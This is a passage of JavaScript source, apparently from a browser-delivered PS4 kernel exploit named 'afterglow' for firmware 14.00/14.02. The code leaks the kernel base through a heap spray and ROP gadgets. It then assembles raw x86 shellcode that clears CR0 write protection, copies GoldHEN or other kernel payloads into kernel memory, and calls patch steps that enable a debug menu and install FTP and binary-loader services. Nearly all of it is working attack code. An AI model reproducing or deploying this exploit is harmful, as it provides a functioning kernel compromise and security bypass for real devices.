      const fertig=[];for(let i=0;i<calls.length;i+=nb){try{fertig.push(host().prepareMany(calls.slice(i,i+nb)))}catch(e){fertig.length=0;break}}
      if(fertig.length){host().runPrepared(fertig[0]);t0=performance.now();for(let i=0;i<fertig.length;i++)host().runPrepared(fertig[i]);t1=performance.now();out.window=(t1-t0).toFixed(2)+" ms in "+fertig.length+" entries"}
    }
    if(out.window===undefined){t0=(typeof performance!=="undefined")?performance.now():Date.now();for(let i=0;i<socks.length;i++)sc(S.setsockopt,socks[i],17,128,req.at,40);t1=(typeof performance!=="undefined")?performance.now():Date.now();out.window=(t1-t0).toFixed(1)+" ms, one entry each (no batching)"}
  }else out.window="not measured";
  for(let i=0;i<socks.length;i++)sc(S.close,socks[i]);
  if(socks.length<TUNE.sprays)no("only "+socks.length+" udp sockets, "+TUNE.sprays+" is a hard floor");
  out.ok=out.reasons.length===0;
  say("probe libc   "+out.libc);say("probe gadget "+out.gadgets+", tail "+out.tail);
  say("probe apm    "+out.apm+", node "+out.probeNode);
  say("probe units  "+out.units+" open: "+out.unitList);
  say("probe refused "+out.unitRefused);say("probe pin    "+out.pin);
  say("probe window "+out.window);say("probe UDP    "+out.udp+" of "+TUNE.sprays+" needed");
  say("probe SHOTS  "+out.units+" units, a run needs 3");
  if(out.ok)say("probe VERDICT usable");else for(let i=0;i<out.reasons.length;i++)say("probe BLOCKED "+out.reasons[i]);
  return out;
}
const GH = {
  tor: 0x47c00, tram: 0x47c40, mark: 0x47e80, kptr: 0x47b20,
  nlOff: 0x50000, nlLen: 636760,
  rvaPad: 0x10ff000, rvaKmem: 0x466540,
};
const GH_STEPS = [
  [0x12f35, "detect firmware, fill the pointer table"],
  [0x9ba88, "UI notice 'GoldHEN'", { ptr: true, rdi: 0x99eeb, esi: 0x1f4 }],
  [0x5cc6,  "save the original pointer from [0x9b8c0]"],
  [0x945,   "kernel patches A"],
  [0xf92,   "kernel patches B"],
  [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
  [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
  [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
  [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
  [0x32c4,  "inject klog      -> 3232"],
  [0x325a,  "inject FTP       -> 2121"],
  [0x328f,  "inject BinLoader -> 9090"],
  [0x31af,  "inject mono ELF  -> SceShellUI"],
  [0x1dd,   "last hook on sysent[591]; turns write protection back on"],
  [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
];
const KP_STEPS = [
  [0x11bd1, "init: firmware detect + import/offset tables"],
  [0x5cf3,  "patch group 1"],
  [0xa65,   "patch group 2"],
  [0x10b2,  "patch group 3"],
  [0x2b6d,  "patch group 4 (testkit + shell)"],
  [0x256e,  "patch group 5 (syscalls 11/c5/c6)"],
  [0x3426,  "patch group 6 (54 kernel patches + exec handler)"],
];
const RAW_STEPS = [
  [0x17e9, "loader_init: firmware detect + import table"],
  [0x391,  "goldhen_is_loaded"],
  [0x1025, "patch_kernel_installer"],
  [0xf2f,  "print_banner"],
  [0x1841, "noop probe (is_kernel_pointer), carries M_TEMP override"],
  [0x1829, "IMP_MALLOC wrapper, alloc 0x1000", { rdi: 0x1000 }],
  [0x1807, "IMP_KMEM_ALLOC wrapper, alloc 0x1000", { rdi: 0x1000 }],
  [0x1093, "load_and_start_kpayload: FTP/klog/BinLoader"],
];

function readFromUSB(filename){
  const mounts = ["/mnt/usb0/", "/mnt/usb1/"];
  for (let m = 0; m < mounts.length; m++) {
    const full = mounts[m] + filename;
    const p = cstr(full);
    const fd = sc(S.open, p.at, 0).i32;
    if (fd < 0) continue;
    say("[usb] opened " + full + " fd=" + fd);
    const end = sc(S.lseek, fd, 0, 2);
    const size = end.lo >>> 0;
    if (size === 0 || size > 0x2000000) {
      sc(S.close, fd);
      continue;
    }
    sc(S.lseek, fd, 0, 0);
    const buf = alloc(size);
    let off = 0;
    while (off < size) {
      const want = Math.min(size - off, 0x10000);
      const got = sc(S.read, fd, plus(buf.at, off), want).i32;
      if (got <= 0) break;
      off += got;
    }
    sc(S.close, fd);
    if (off < size) continue;
    say("[usb] " + size + " bytes loaded from " + full);
    return buf.u8.slice(0, size);
  }
  return null;
}

async function fetchBytes(url,tag){
  try{const r=await fetch(url+(url.indexOf("?")<0?"?":"&")+"_="+Date.now());
    if(!r.ok){say("["+tag+"] "+url+" HTTP "+r.status);return null}
    return new Uint8Array(await r.arrayBuffer());
  }catch(e){say("["+tag+"] "+url+" unreachable: "+(e&&e.message));return null}
}

async function runPatchSet(room){
  const c=host();let pset=null;
  try{
    const r2=await fetch("patchset.bin");
    if(r2.ok)pset=new Uint8Array(await r2.arrayBuffer());
  }catch(e){}
  if(!pset||!pset.length)pset=readFromUSB("patchset.bin");
  if(!pset||!pset.length){say("[g] patchset.bin not available from HTTP or USB");return false}
  if(pset.length>0x400-0xc0){say("[g] patchset does not fit in body area");return false}
  wrbuf(plus(room,0xc0),pset);
  say("[g] patchset.bin loaded "+pset.length+" bytes -- calling gate");
  const pr=c.callAddr(plus(room,GATE),[11,plus(room,0xc0)]);
  say("[g] [0] kernel patch set, "+pset.length+" bytes -> 0x"+((pr&&pr.lo>>>0)||0).toString(16));
  return true;
}

async function loadKpayloadSteps(k,kbase,room){
  const c=host();
  let blob=await fetchBytes("kpayload.bin","kp");
  if(!blob||!blob.length)blob=readFromUSB("kpayload.bin");
  if(!blob||!blob.length){say("[kp] kpayload.bin not available");return false}
  say("[kp] "+blob.length+" bytes inflated kpayload");

  const size=(0x50000+blob.length+0x4fff)&~0xfff;
  const m=sc(S.mmap,0,size+0x1000,3,0x1002,-1,0);
  const buf=v(m.lo,m.hi);const data=plus(buf,0x50000);
  if(m.i32===-1||(buf.hi>>>0)===0){say("[kp] mmap failed, errno "+c.errno());return false}
  for(let o=0;o<=size;o+=0x1000)wr4(plus(buf,o),0);
  if(sc(S.mprotect,buf,size+0x1000,7).i32!==0){say("[kp] mprotect rwx failed");return false}
  codeAt(buf,GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
  codeAt(buf,GH.tram+0x200).hex("c3");
  const r3=c.callAddr(plus(buf,GH.tram+0x200),[]);
  if(r3===undefined||r3===null){say("[kp] gate page does not execute in ring 3");return false}
  say("[kp] gate page executes in ring 3");

  for(let o=0;o<blob.length;o+=8){
    let lo=0,hi=0;
    for(let j=0;j<4;j++)lo|=(blob[o+j]||0)<<(8*j);
    for(let j=0;j<4;j++)hi|=(blob[o+4+j]||0)<<(8*j);
    c.p.write8(plus(data,o),v(lo>>>0,hi>>>0));
  }
  say("[kp] kpayload staged at "+text(data));

  const t=plus(kbase,GH.rvaPad);
  const tram={n:0};
  const b1=function(x){wr1(plus(buf,GH.tram+tram.n),x);tram.n++};
  const hex=function(h){const u=unhex(h);for(let i=0;i<u.length;i++)b1(u[i])};
  const i32=function(n){for(let j=0;j<4;j++)b1(Math.floor(n/Math.pow(256,j))%256)};
  const q64=function(q){i32(q.low>>>0);i32(q.hi>>>0)};
  const callAbs=function(rva){hex("48b8");q64(plus(t,rva));hex("ffd0")};
  const wpOff=function(){hex("0f20c0");hex("4825");i32(0xfffeffff);hex("0f22c0")};
  const wpOn=function(){hex("0f20c0");hex("480d");i32(0x00010000);hex("0f22c0")};
  const fire=function(){const r=c.callAddr(plus(buf,GH.tor),[11,plus(buf,GH.tram)]);return r.lo>>>0};
  const markClear=function(){wr4(plus(buf,GH.mark),0xDEADBEEF);wr4(plus(buf,GH.mark+4),0xDEADBEEF)};
  const markRead=function(){return[rd4(plus(buf,GH.mark)),rd4(plus(buf,GH.mark+4))]};

  say("[kp] kernel base "+text(kbase)+", padding "+text(t));
  if(!(await runPatchSet(room)))return false;
  const dmapPad=paddingRW(k,kbase);
  if(!dmapPad){say("[kp] stopping: padding setup failed");return false}

  say("[kp] rep movsb -> dmap "+text(dmapPad));
  tram.n=0;wpOff();
  hex("48be");q64(data);
  hex("48bf");q64(dmapPad);
  hex("b9");i32(blob.length);
  hex("fc");hex("f3a4");
  wpOn();hex("b8");i32(0x5758);hex("c3");
  const cp=fire();
  if(cp!==0x5758){say("[kp] copy returned 0x"+cp.toString(16));return false}
  say("[kp] "+blob.length+" bytes into the padding");

  let silent=0;
  for(let n=0;n<KP_STEPS.length;n++){
    const rva=KP_STEPS[n][0],what=KP_STEPS[n][1];
    markClear();tram.n=0;wpOff();
    const stepStack=plus(t,0xff000);
    hex("48b9");q64(stepStack);hex("488921");
    hex("48bc");q64(stepStack);
    hex("31ff");hex("31f6");hex("31c0");
    callAbs(rva);
    hex("4898");
    hex("48b9");q64(plus(buf,GH.mark));
    hex("488901");
    hex("48b9");q64(stepStack);hex("488b21");
    wpOn();hex("31c0");hex("c3");
    say("[kp] SYNC entering ["+(n+1)+"] 0x"+rva.toString(16)+" "+what+" (stack "+text(stepStack)+")");
    fire();
    const mk=markRead();
    if(mk[1]===0xDEADBEEF){
      say("[kp] ["+(n+1)+"] 0x"+rva.toString(16)+" did NOT come back -- "+what);
      silent++;break;
    }
    let rc=mk[0];
    if(mk[1]===0xffffffff)rc=mk[0]-0x100000000;
    say("[kp] ["+(n+1)+"] 0x"+rva.toString(16)+" rc="+rc+" -- "+what);
    if(n===0&&rc!==0){say("[kp] init failed -- stopping before bad call");return false}
  }
  say("[kp] kpayload patch chain finished, "+silent+" silent");
  return silent===0;
}

async function loadRawKernel(url,k,kbase,room,vorab){
  const c=host();let blob=vorab||null;
  if(blob===null){
    blob=await fetchBytes(url,"p");
    if(blob===null)blob=readFromUSB(url);
    if(blob===null)return false;
  }
  if(!blob||!blob.length){say("[p] empty raw payload");return false}
  if(blob[0]!==0xe9){say("[p] not a leading-jmp raw payload -- refusing");return false}

  let size=(blob.length+0xfff)&~0xfff;
  if(size<0x48000)size=0x48000;
  const m=sc(S.mmap,0,size+0x1000,3,0x1002,-1,0);
  const buf=v(m.lo,m.hi);
  if(m.i32===-1||(buf.hi>>>0)===0){say("[p] mmap failed, errno "+c.errno());return false}
  for(let o=0;o<=size;o+=0x1000)wr4(plus(buf,o),0);
  if(sc(S.mprotect,buf,size+0x1000,7).i32!==0){say("[p] mprotect rwx failed, errno "+c.errno());return false}
  codeAt(buf,GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
  codeAt(buf,GH.tram+0x200).hex("c3");
  const r3=c.callAddr(plus(buf,GH.tram+0x200),[]);
  if(r3===undefined||r3===null){say("[p] gate page does not execute in ring 3 -- stopping");return false}
  say("[p] gate page executes in ring 3");

  for(let o=0;o<blob.length;o+=8){
    let lo=0,hi=0;
    for(let j=0;j<4;j++)lo|=(blob[o+j]||0)<<(8*j);
    for(let j=0;j<4;j++)hi|=(blob[o+4+j]||0)<<(8*j);
    c.p.write8(plus(buf,o),v(lo>>>0,hi>>>0));
  }
  say("[p] "+blob.length+" loader bytes staged at "+text(buf));

  for(let o=0;o<10;o++)wr1(plus(buf,0x1068+o),0x90);
  for(let o=0;o<4;o++)wr1(plus(buf,0x1136+o),0x90);
  say("[p] diag: NOP'd console-output write (0x1068) and kpayload entry call (0x1136)");

  const t=plus(kbase,GH.rvaPad);
  const tram={n:0};
  const b1=function(x){wr1(plus(buf,GH.tram+tram.n),x);tram.n++};
  const hex=function(h){const u=unhex(h);for(let i=0;i<u.length;i++)b1(u[i])};
  const i32=function(n){for(let j=0;j<4;j++)b1(Math.floor(n/Math.pow(256,j))%256)};
  const q64=function(q){i32(q.low>>>0);i32(q.hi>>>0)};
  const callAbs=function(rva){hex("48b8");q64(plus(t,rva));hex("ffd0")};
  const wpOff=function(){hex("0f20c0");hex("4825");i32(0xfffeffff);hex("0f22c0")};
  const wpOn=function(){hex("0f20c0");hex("480d");i32(0x00010000);hex("0f22c0")};
  const fire=function(){const r=c.callAddr(plus(buf,GH.tor),[11,plus(buf,GH.tram)]);return r.lo>>>0};
  const markClear=function(){wr4(plus(buf,GH.mark),0xDEADBEEF);wr4(plus(buf,GH.mark+4),0xDEADBEEF)};
  const markRead=function(){return[rd4(plus(buf,GH.mark)),rd4(plus(buf,GH.mark+4))]};

  say("[p] kernel base "+text(kbase)+", padding "+text(t));
  if(!(await runPatchSet(room)))return false;
  if(!paddingRW(k,kbase)){say("[p] stopping: padding would stay read only");return false}

  tram.n=0;wpOff();
  hex("48be");q64(buf);
  hex("48bf");q64(t);
  hex("b9");i32(blob.length);
  hex("fc");hex("f3a4");
  wpOn();hex("b8");i32(0x5758);hex("c3");
  const cp=fire();
  if(cp!==0x5758){say("[p] copy into padding returned 0x"+cp.toString(16));return false}
  say("[p] "+blob.length+" bytes into the padding");

  let silent=0;
  for(let n=0;n<RAW_STEPS.length;n++){
    const rva=RAW_STEPS[n][0],what=RAW_STEPS[n][1];
    markClear();tram.n=0;wpOff();
    if(rva===0x1841){
      wr8(plus(buf,0x47550),plus(kbase,0x1520d00));
      say("[p] diag: M_TEMP overridden -> kbase+0x1520d00 (was 0x2be1f0/code)");
    }
    const opt=RAW_STEPS[n][2]||{};
    if(opt.rdi!==undefined){hex("bf");i32(opt.rdi)}
    else{hex("31ff")}
    hex("31c0");
    callAbs(rva);
    hex("4898");
    hex("48b9");q64(plus(buf,GH.mark));
    hex("488901");
    wpOn();hex("31c0");hex("c3");
    fire();
    const mk=markRead();
    if(mk[1]===0xDEADBEEF){
      say("[p] ["+(n+1)+"] 0x"+rva.toString(16)+" did NOT come back -- "+what);
      silent++;break;
    }
    let rc=mk[0];
    if(mk[1]===0xffffffff)rc=mk[0]-0x100000000;
    say("[p] ["+(n+1)+"] 0x"+rva.toString(16)+" rc="+rc+" -- "+what);
    if(n===0&&rc!==0){say("[p] loader_init failed -- stopping before bad call");return false}
  }
  say("[p] raw loader chain finished, "+silent+" silent");
  return silent===0;
}

async function loadEnabler(url,k,kbase,room){
  let blob=readFromUSB(url||"goldhen.bin");
  if(!blob)blob=readFromUSB("payload.bin");
  if(blob){
    say("[e] "+blob.length+" bytes from USB");
  }else{
    blob=await fetchBytes(url||"goldhen.bin","e");
  }
  if(!blob||!blob.length)return false;
  if(blob.length===GH.nlOff+GH.nlLen){
    say("[e] "+blob.length+" bytes -- composite image path");
    return loadGoldhen(url,k,kbase,room,blob);
  }
  if(blob[0]===0xe9){
    say("[e] "+blob.length+" bytes, leading jmp -- raw payload path");
    say("[e] raw payload -- gated step-loader: patchset + kernel padding route");
    return loadRawKernel(url,k,kbase,room,blob);
  }
  say("[e] "+blob.length+" bytes -- unsupported image format");
  return false;
}

async function loadGoldhen(url,k,kbase,room,vorab){
  const c=host();let blob=vorab||null;
  if(blob===null){
    blob=await fetchBytes(url,"g");
    if(blob===null)blob=readFromUSB(url);
    if(blob===null)return false;
  }
  if(blob.length!==GH.nlOff+GH.nlLen){
    say("[g] "+blob.length+" bytes, expected "+(GH.nlOff+GH.nlLen)+" -- not composite image format");
    return false;
  }
  const size=(blob.length+0x4fff)&~0xfff;
  const m=sc(S.mmap,0,size+0x1000,3,0x1002,-1,0);const buf=v(m.lo,m.hi);
  if(m.i32===-1||(buf.hi>>>0)===0){say("[g] mmap failed, errno "+c.errno());return false}
  for(let o=0;o<=size;o+=0x1000)wr4(plus(buf,o),0);
  if(sc(S.mprotect,buf,size+0x1000,7).i32!==0){say("[g] mprotect rwx failed, errno "+c.errno());return false}
  codeAt(buf,GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
  codeAt(buf,GH.tram+0x200).hex("c3");
  const r3=c.callAddr(plus(buf,GH.tram+0x200),[]);
  if(r3===undefined||r3===null){say("[g] trampoline page does not execute in ring 3 -- stopping");return false}
  say("[g] trampoline page executes in ring 3");

  for(let o=0;o<blob.length;o+=8){
    let lo=0,hi=0;
    for(let k2=0;k2<4;k2++)lo|=(blob[o+k2]||0)<<(8*k2);
    for(let k2=0;k2<4;k2++)hi|=(blob[o+4+k2]||0)<<(8*k2);
    c.p.write8(plus(buf,o),v(lo>>>0,hi>>>0));
  }
  say("[g] "+blob.length+" bytes at "+text(buf));

  let t=null;const tram={n:0};
  const b1=function(x){wr1(plus(buf,GH.tram+tram.n),x);tram.n++};
  const hex=function(h){const u=unhex(h);for(let i=0;i<u.length;i++)b1(u[i])};
  const i32=function(n){for(let k2=0;k2<4;k2++)b1(Math.floor(n/Math.pow(256,k2))%256)};
  const q64=function(q){i32(q.low>>>0);i32(q.hi>>>0)};
  const callAbs=function(rva){hex("48b8");q64(plus(t,rva));hex("ffd0")};
  const wpOff=function(){hex("0f20c0");hex("4825");i32(0xfffeffff);hex("0f22c0")};
  const wpOn=function(){hex("0f20c0");hex("480d");i32(0x00010000);hex("0f22c0")};
  const fire=function(){const r=c.callAddr(plus(buf,GH.tor),[11,plus(buf,GH.tram)]);return r.lo>>>0};
  const markClear=function(s2){wr4(plus(buf,GH.mark+s2*8),0xDEADBEEF);wr4(plus(buf,GH.mark+s2*8+4),0xDEADBEEF)};
  const markRead=function(s2){return[rd4(plus(buf,GH.mark+s2*8)),rd4(plus(buf,GH.mark+s2*8+4))]};

  if(!(await runPatchSet(room)))return false;
  const kb=kbase;t=plus(kb,GH.rvaPad);
  wr8(plus(buf,GH.kptr),plus(kb,GH.rvaKmem));
  say("[g] kernel base "+text(kb)+", padding "+text(t));

  const dmapPad=paddingRW(k,kb);
  if(!dmapPad){say("[g] stopping: padding would stay read only");return false}

  tram.n=0;wpOff();
  hex("48be");q64(plus(buf,GH.nlOff));
  hex("48bf");q64(dmapPad);
  hex("b9");i32(GH.nlLen);
  hex("fc");hex("f3a4");
  wpOn();hex("b8");i32(0x5758);hex("c3");
  const cp=fire();
  if(cp!==0x5758){say("[g] copy into padding returned 0x"+cp.toString(16));return false}
  say("[g] [3] "+GH.nlLen+" bytes into padding");

  let good=0,silent=0;
  for(let n=0;n<GH_STEPS.length;n++){
    const rva=GH_STEPS[n][0],what=GH_STEPS[n][1],o=GH_STEPS[n][2]||{};
    markClear(0);tram.n=0;wpOff();
    const stepStack=plus(t,0xff000);
    hex("48b9");q64(stepStack);hex("488921");
    hex("48bc");q64(stepStack);
    if(o.rdi!==undefined){hex("48bf");q64(plus(t,o.rdi))}
    if(o.esi!==undefined){hex("be");i32(o.esi)}
    hex("31c0");
    if(o.ptr){hex("48b8");q64(plus(t,rva));hex("488b00");hex("ffd0")}
    else callAbs(rva);
    hex("4898");
    hex("48b9");q64(plus(buf,GH.mark));
    hex("488901");
    hex("48b9");q64(stepStack);hex("488b21");
    wpOn();hex("31c0");hex("c3");
    fire();
    const mk=markRead(0);
    if(mk[1]===0xDEADBEEF){
      say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" did NOT come back -- "+what);
      silent++;
    }else{
      let rc=mk[0];
      if(mk[1]===0xffffffff)rc=mk[0]-0x100000000;
      good++;
      if(rc!==0)say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" rc="+rc+(rc===3?" (already injected)":""));
    }
  }
  say("[g] "+good+" of "+GH_STEPS.length+" calls returned, "+silent+" silent");
  return silent===0;
}

async function loadPayload(url,vorab){
  const c=host();let blob=vorab||null;
  if(blob===null){blob=await fetchBytes(url,"p");if(blob===null)blob=readFromUSB(url);if(blob===null)return false}
  if(!blob.length){say("[p] "+url+" is empty");return false}
  if(blob[0]!==0xe9){say("[p] "+url+" does not start with a jmp");return false}
  const size=(blob.length+0x3fff)&~0x3fff;
  const m=sc(S.mmap,0,size,3,0x1002,-1,0);const entry=v(m.lo,m.hi);
  if(m.i32===-1||(entry.hi>>>0)===0){say("[p] mmap failed, errno "+c.errno());return false}
  for(let o=0;o<size;o+=0x1000)wr4(plus(entry,o),0);
  if(sc(S.mprotect,entry,size,7).i32!==0){say("[p] mprotect rwx failed, errno "+c.errno());return false}
  codeAt(entry,0).hex("c3");
  const probe=c.callAddr(entry,[]);
  if(probe===undefined||probe===null){say("[p] entry page does not execute in ring 3");return false}
  say("[p] entry page executes in ring 3, loading payload");
  for(let o=0;o<blob.length;o+=8){let lo=0,hi=0;
    for(let k=0;k<4;k++)lo|=(blob[o+k]||0)<<(8*k);
    for(let k=0;k<4;k++)hi|=(blob[o+4+k]||0)<<(8*k);
    c.p.write8(plus(entry,o),v(lo>>>0,hi>>>0))
  }
  for(let o=0;o<blob.length;o+=8){let lo=0,hi=0;
    for(let k=0;k<4;k++)lo|=(blob[o+k]||0)<<(8*k);
    for(let k=0;k<4;k++)hi|=(blob[o+4+k]||0)<<(8*k);
    const q=c.p.read8(plus(entry,o));
    if((q.low>>>0)!==(lo>>>0)||(q.hi>>>0)!==(hi>>>0)){say("[p] copy mismatch at 0x"+o.toString(16));return false}
  }
  for(let o=0;o<10;o++)wr1(plus(entry,0x1068+o),0x90);
  wr1(plus(entry,0x3490),0x00);wr1(plus(entry,0x3491),0x0d);wr1(plus(entry,0x3492),0x52);wr1(plus(entry,0x3493),0x01);
  say("[p] console-output NOP, M_TEMP -> 0x1520d00");
  for(let o=0;o<4;o++)wr1(plus(entry,0x1136+o),0x90);
  say("[p] kpayload entry NOP'd");
  const SLOT_1352=0x3cb9c00;
  const slot=(c.off&&c.off.wk___imp_pthread_create!==undefined)?c.off.wk___imp_pthread_create:SLOT_1352;
  if(!c.webkitBase||!c.libkernelBase){say("[p] no module bases");return false}
  const fnr=c.p.read8(c.webkitBase.add32(slot));const fn=v(fnr.low,fnr.hi);
  const d=(fn.hi-(c.libkernelBase.hi>>>0))*LOW+(fn.low-(c.libkernelBase.low>>>0));
  if((fn.hi>>>0)!==(c.libkernelBase.hi>>>0)||d<=0||d>0x400000){say("[p] slot +0x"+slot.toString(16)+" holds "+text(fn)+", not inside libkernel");return false}
  say("[p] pthread_create at "+text(fn)+" = libkernel +0x"+d.toString(16));
  const thr=alloc(8);thr.u8.fill(0);
  const rc=c.callAddr(fn,[thr.at,0,entry,0]).i32;const handle=qAt(thr,0);
  const started=rc===0&&(handle.hi>>>0)>0;
  say("[p] "+blob.length+" bytes at "+text(entry)+", thread rc="+rc+(started?" -- running":" -- did NOT start"));
  return started;
}

function enableDebugMenu(k,kbase){
  try{
    const TEXT_SIZE=0xCFE880;const DATA_OFF=0x1520000;
    const c=k.begin();
    c.hex("48bf").qw(kbase);c.hex("48be").qw(plus(kbase,TEXT_SIZE));
    c.hex("48ba").qw(v(0x676d6372,0x65645f72));
    c.hex("4839f7").hex("730b").hex("483917").hex("740b").hex("4883c701").hex("ebf0");
    c.hex("4831c0").hex("eb03").hex("4889f8");
    c.hex("49ba").qw(plus(k.at,OUT)).hex("498902");
    if(!k.run())return;
    const strAddr=k.out();if(!strAddr||isZero(strAddr))return;
    const tail=k.read(plus(strAddr,8),8);
    if(!tail||tail[0]!==0x62||tail[1]!==0x75||tail[2]!==0x67)return;
    const c2=k.begin();
    c2.hex("48bf").qw(plus(kbase,DATA_OFF));c2.hex("48be").qw(plus(kbase,DATA_OFF+0x700000));
    c2.hex("48ba").qw(strAddr);
    c2.hex("4839f7").hex("730b").hex("483917").hex("740b").hex("4883c708").hex("ebf0");
    c2.hex("4831c0").hex("eb03").hex("4889f8");
    c2.hex("49ba").qw(plus(k.at,OUT)).hex("498902");
    if(!k.run())return;
    const hit=k.out();if(!hit||isZero(hit))return;
    const fn=k.read_v(plus(hit,0x08));if(!fn||isZero(fn))return;
    const fnRva=(fn.low-kbase.low)>>>0;if(fnRva>=TEXT_SIZE)return;
    const body=k.read(fn,80);if(!body)return;
    let target=null,i=0;
    for(i=0;i<body.length-6;i++){
      if(body[i]===0xe8&&body[i+5]===0x85){
        let d=body[i+1]|(body[i+2]<<8)|(body[i+3]<<16)|(body[i+4]<<24);
        if(d>=0x80000000)d-=0x100000000;
        const ct=fnRva+i+5+d;
        if(ct>0&&ct<TEXT_SIZE){target=ct;say("[dbg] rcmgr check at rva 0x"+ct.toString(16));break}
      }
    }
    if(target===null)return;
    let target2=null;
    for(let j=i+5;j<body.length-6;j++){
      if(body[j]===0xe8&&body[j+5]===0x85){
        let d2=body[j+1]|(body[j+2]<<8)|(body[j+3]<<16)|(body[j+4]<<24);
        if(d2>=0x80000000)d2-=0x100000000;
        const ct2=fnRva+j+5+d2;
        if(ct2>0&&ct2<TEXT_SIZE&&ct2!==target){target2=ct2;say("[dbg] rcmgr check2 at rva 0x"+ct2.toString(16));break}
      }
    }
    const plist=[[target,"b8010000","rcmgr1a"],[target+4,"00c3","rcmgr1b"]];
    if(target2!==null){plist.push([target2,"b8010000","rcmgr2a"]);plist.push([target2+4,"00c3","rcmgr2b"])}
    k.apply(kbase,plist);
    say("debug menu enabled -- go to Settings");
  }catch(e){say("[dbg] enableDebugMenu: "+((e&&e.message)||e))}
}
async function attempt(ctx,opts){
  STATE.ctx=ctx;opts=opts||{};STATE.retry=false;
  say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02");
  const missing=seedStubs();
  if(missing.length){say("  no libkernel stub for "+missing.join(",")+" -- stopping");return false}
  const pin=pinCore();
  if(!pin.ok){say("  cpu pin failed ("+pin.note+") -- refusing to go on.");return false}
  say("  pinned to core "+pin.core+" of ["+pin.allowed+"]");
  {
    const m0=sc(S.mmap,0,0x4000,3,0x1002,-1,0);
    if(m0.i32!==-1&&sc(S.mprotect,v(m0.lo,m0.hi),0x4000,7).i32===0){say("  kernel already open -- a run has succeeded.");return false}
  }
  let lib=findLib("libSceLibcInternal.sprx");
  if(!lib.base)lib=findLibByShape();
  const libc=lib.base;
  if(!libc){say("  "+(lib.note||"libc not mapped"));return false}
  const gad={};
  for(const name in GADGETS){
    const want=unhex(GADGETS[name][1]);const at=plus(libc,GADGETS[name][0]);
    if(!sameBytes(rdbuf(at,want.length),want)){say("  gadget "+name+" missing -- not the libc build");return false}
    gad[name]=at;
  }
  const shot=shooter(gad);const hostPage=plus(libc,HOST.page),hostFree=plus(libc,HOST.free);
  let kbase=STATE.base;
  if(kbase)say("[1] base "+text(kbase)+", carried over");
  else{
    const win=alloc(TUNE.window+16);wipe(win,TUNE.window+16);
    const r=shot.take(function(c){
      c.gad("rcx");c.num(14);c.gad("shr");c.gad("shl");c.grab(win.at,TUNE.window);
    });
    const at=function(off){return qAt(win,off)};
    let found=null;
    for(let off=0;off<=TUNE.window-0x20;off+=8){
      const a=at(off);
      if(a.hi===0xffffffff){const b=at(off+8),c2=at(off+0x10),d=at(off+0x18);
        if(b.hi===0xffffffff&&c2.hi===0xffffffff&&d.hi===0xffffffff&&((b.low-a.low)>>>0)===0x20&&((c2.low-a.low)>>>0)===0x40&&((d.low-a.low)>>>0)===0x50){found=a;break}}
    }
    let voted=null;
    {
      const mark=K.anchor%0x4000,tally={};
      for(let off=0;off<=TUNE.window-8;off+=8){const a=at(off);if(a.hi===0xffffffff&&a.low!==0xffffffff&&a.low%0x4000===mark){const b=(a.low-K.anchor)>>>0;if(b%0x4000===0)tally[b]=(tally[b]||0)+1}}
      let best=null,top=0,second=0;
      for(const b in tally){const n=tally[b];if(n>top){second=top;best=Number(b);top=n}else if(n>second)second=n}
      if(best!==null&&top>second)voted=v(best+K.anchor,0xffffffff);
    }
    if(found&&voted&&!same(found,voted)){say("[1] readings disagree: "+text(found)+" vs "+text(voted)+" -- stopping");return false}
    found=found||voted;
    if(found&&((found.low-K.anchor)>>>0)%0x4000!==0){const rem=((found.low-K.anchor)>>>0)%0x4000;const delta=rem<=0x2000?rem:-(0x4000-rem);const oldA=K.anchor;K.anchor+=delta;say("[1] anchor grid-shifted "+delta+": 0x"+oldA.toString(16)+" -> 0x"+K.anchor.toString(16))}
    say("[1] leak: queue="+r+" sprays="+shot.sprayed+" anchor="+(found?text(found):"missed")+((found&&voted&&same(found,voted))?" (both agree)":""));
    if(!found){if(r===null&&shot.sprayed===0){say("    no free apm unit left -- this boot is spent, reboot.")}else{say("    the spray did not take");STATE.retry=true}return false}
    kbase=plus(found,-K.anchor);STATE.base=kbase;say("    base "+text(kbase));
  }
  {
    const SCAN_WIN=0x1000,SCAN_PRE=0x200;
    const scanBuf=alloc(SCAN_WIN+16);wipe(scanBuf,SCAN_WIN+16);
    const scanRef=alloc(16);pokeAt(scanRef,0,plus(kbase,K.swap_rbp-SCAN_PRE));
    const scanR=shot.take(function(c){c.load_rax(scanRef.at);c.grab(scanBuf.at,SCAN_WIN)},0x400);
    say("[1b] gadget scan: "+(scanR===null?("null -- "+shot.why):("chain="+scanR)));
    if(ran(scanR)){const sb=rdbuf(scanBuf.at,SCAN_WIN);let hit=-1;
      for(let i=0;i<SCAN_WIN-2;i++){if(sb[i]===0x4E&&sb[i+1]===0x95&&sb[i+2]===0xC3){hit=i;break}}
      if(hit>=0){const realRVA=K.swap_rbp-SCAN_PRE+hit;const delta=realRVA-K.swap_rbp;say("[1b] swap_rbp at scan+"+hit+" rva=0x"+realRVA.toString(16)+(delta!==0?(" (shifted "+delta+")"):" (same)"));K.swap_rbp=realRVA}
      else say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
    }else say("[1b] scan shot missed -- using original K.swap_rbp");
  }
  const kat=function(rva){return plus(kbase,rva)};
  let probe=-1,node=null;
  for(let i=0;i<PROBE_NODES.length&&probe<0;i++){probe=sc(S.open,cstr(PROBE_NODES[i]).at,0).i32;if(probe>=0)node=PROBE_NODES[i]}
  if(probe<0){say("[2] no device node opened for probe");return false}
  for(let off=0;off<=HOST.last-HOST.free-4;off+=4){if(rd4(plus(hostFree,off))!==0){say("[2] spare room behind libc occupied");return false}}
  say("[2] probe fd "+probe+" on "+node+", "+(HOST.last-HOST.free)+" bytes spare");
  let reach=TUNE.entries;
  if(MAPS){for(let i=0;i<MAPS.length;i++){const a0=MAPS[i][0],b0=MAPS[i][1];
